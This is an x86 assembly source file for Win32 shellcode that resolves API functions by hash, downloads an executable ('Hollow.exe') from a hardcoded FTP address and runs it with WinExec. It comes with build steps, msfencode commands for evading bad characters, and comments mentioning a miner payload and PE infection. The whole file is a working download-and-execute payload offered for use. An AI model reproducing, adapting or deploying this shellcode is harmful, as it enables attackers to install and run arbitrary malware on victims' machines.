; ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
; Download and execute script win32 shellcode
; ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
;
; Modified from "Download & execute" code from here http://www.klake.org/~jt/asmcode/
; Uses URLDownloadToFile, so will use Internet Explorer's proxy settings if configured.
; The running program needs write permissions to the PWD.
; 
; Change URL string at the end then assemble using the following, where this file is saved as descript.asm:
; >nasm -f bin descript.asm -o descript.bin
;
; Then cat into msfencode to encode around bad characters, e.g.
; >cat descript.bin | msfencode -a x86 -b '\x00\x0a\x0d' -t c
;
;
; @algafix
; 
; # ---------- Generating binary files ------------
; nasm -f elf32 shellcode.asm -o shellcode.o
; ld -melf_i386 -o shellcode shellcode.o
;
; # ------ Generating C hex of the bin code -------
; objcopy -O binary -j .text shellcode.o shellcode_c_hex.txt
; echo $(od -An -t x1 shellcode_c_hex.txt) > shellcode_c_hex.txt
; sed -i -e '1s:^:\\x:g' -e 's:\ :\\x:g' shellcode_c_hex.txt
;
; cat shellcode_c_hex.txt
;
; ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
; Code starts here
; ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

[BITS 32]

global _start

_start:
	jmp startup

; ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
; Functions to find kernel32 and to allow calling of other functions in sc
; ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

find_kernel32:

	xor ecx, ecx                ; zeroing register ECX
	mul ecx                     ; zeroing register EAX EDX
	mov eax, [fs:ecx + 0x030]   ; PEB loaded in eax
	mov eax, [eax + 0x00c]      ; LDR loaded in eax
	mov esi, [eax + 0x014]      ; InMemoryOrderModuleList loaded in esi
	lodsd                       ; currentProgram.exe address loaded in eax (1st module)
	xchg esi, eax				
	lodsd                       ; ntdll.dll address loaded (2nd module)
	mov ebx, [eax + 0x10]       ; kernel32.dll address loaded in ebx (3rd module)

	; EBX = base of kernel32.dll address

	ret

find_function:
	pushad			      ; Save all registers
	mov   ebp, [esp + 0x24]       ; Store the base address in eax
	mov   eax, [ebp + 0x3c]       ; PE header VMA
	mov   edx, [ebp + eax + 0x78] ; Export table relative offset
	add   edx, ebp                ; Export table VMA
	mov   ecx, [edx + 0x18]       ; Number of names
	mov   ebx, [edx + 0x20]       ; Names table relative offset
	add   ebx, ebp                ; Names table VMA

find_function_loop:
	jecxz find_function_finished  ; Jump to the end if ecx is 0
	dec   ecx                     ; Decrement our names counter
	mov   esi, [ebx + ecx * 4]    ; Store the relative offset of the name
	add   esi, ebp                ; Set esi to the VMA of the current name

compute_hash:
	xor   edi, edi                ; Zero edi
	xor   eax, eax                ; Zero eax
	cld                           ; Clear direction

compute_hash_again:
	lodsb                         ; Load the next byte from esi into al
	test  al, al                  ; Test ourselves.
	jz    compute_hash_finished   ; If the ZF is set, we've hit the null term.
	ror   edi, 0xd                ; Rotate edi 13 bits to the right
	add   edi, eax                ; Add the new byte to the accumulator
	jmp   compute_hash_again      ; Next iteration

compute_hash_finished:         
find_function_compare:           
	cmp   edi, [esp + 0x28]       ; Compare the computed hash with the requested hash
	jnz   find_function_loop      ; No match, try the next one.
	mov   ebx, [edx + 0x24]       ; Ordinals table relative offset
	add   ebx, ebp                ; Ordinals table VMA
	mov   cx, [ebx + 2 * ecx]     ; Extrapolate the function's ordinal
	mov   ebx, [edx + 0x1c]       ; Address table relative offset
	add   ebx, ebp                ; Address table VMA
	mov   eax, [ebx + 4 * ecx]    ; Extract the relative function offset from its ordinal
	add   eax, ebp                ; Function VMA
	mov   [esp + 0x1c], eax       ; Overwrite stack version of eax from pushad

find_function_finished:
	popad                         ; Restore all registers
	ret

; ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
; Download and Execute Script specific instructions start here
; ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

begin:		
	call find_kernel32	; Find kernel32 address
	pop edi			; Address of urlmon: label popped from stack to edi
	sub edi, urlmon-urldata	; Now edi has address of url, like "add edi, urldata-urlmon" without \x0 bytes 	
	jmp urlmon		; Jump over call statement

startup:
	call begin		; Redirect execution to begin: label, address of next instruction (urlmon:) pushed to stack


urlmon:
	push 0xec0e4e8e		; LoadLibraryA hash
	push ebx			; kernel32 base address
	call find_function	; find address

	; LoadLibraryA (LPCTSTR lpLibFileName)
	xor ecx, ecx		; ecx = 0
	mov cx, 0x6e6f		; Move "on" in cx register, lower two bytes of ecx
	push ecx			; Push null-terminated "on" to stack ("on" + \x0\x0)
	push 0x6d6c7275		; Push "urlm", null terminated "urlmon" on stack
	push esp			; lpLibFileName
	call eax			; eax holds our function address

download:
	push  0x702f1a36	; URLDownloadToFileA hash
	push eax			; urlmon.dll base address
	call find_function	; find address

	; URLDownloadToFileA (LPUNKNOWN pCaller, LPCTSTR szURL, LPCTSTR szFileName, DWORD dwReserved, LPBINDSTATUSCALLBACK lpfnCB);
	xor ecx, ecx		; ecx = 0 for later use
	push ecx			; lpfnCB
	push ecx			; dwReserved
	lea esi, [edi]		; esi gets offset of URL	
	add esi, cmddata-urldata	; Now esi has command to run, same as "sub esi, urldata-cmddata" but without \x0 byte
	lea edx, [esi]		; edx gets script filename from command, downloaded file saved to this name
	push edx			; szFileName
	push edi			; szURL
	push ecx			; pCaller
	call eax			; eax holds our function address

execute:
	push 0x0e8afe98		; WinExec hash
	push ebx			; kernel32 base address
	call find_function	; find address

	; WinExec (LPCSTR lpCmdLine, UINT uCmdShow)
	inc ecx			; ecx = 1
	push ecx		; uCmdShow 
	push esi		; lpCmdLine. We already have the exe path in esi
	call eax		; eax holds our function address

	jmp ending


; ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
; Variable data stored here
; ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


cmddata:
; Script command to execute.  File from URL gets saved to disk as the script name specified in command below
; If we want to call another program to execute the file (i.e. Python) add the size of the extra string to
; the above "lea edx, [esi]" to "lea edx, [esi + X]". In the case of python3 miner.py: [esi + 8]

db "c:/ProgramData/Hollow.exe", 0
;db "miner.exe", 0

urldata:
; Change this to provide your own URL

;db "http://the.earth.li/~sgtatham/putty/latest/w32/putty.exe", 0
db "ftp://192.168.66.66/Hollow.exe", 0

ending:
; Skip the execution of the db data to allow PE infection
	nop
	nop



kernel32_eax:
	mov eax, [fs:30h]		    ; Pointer to PEB
	mov eax, [eax + 0ch]		; Pointer to Ldr
	mov eax, [eax + 14h]		; Pointer to InMemoryOrderModuleList
								; linked list, let's iterate
	mov eax, [eax]				; this program's module
	mov eax, [eax]				; ntdll module
	mov eax, [eax -8h + 18h]	; kernel32.DllBase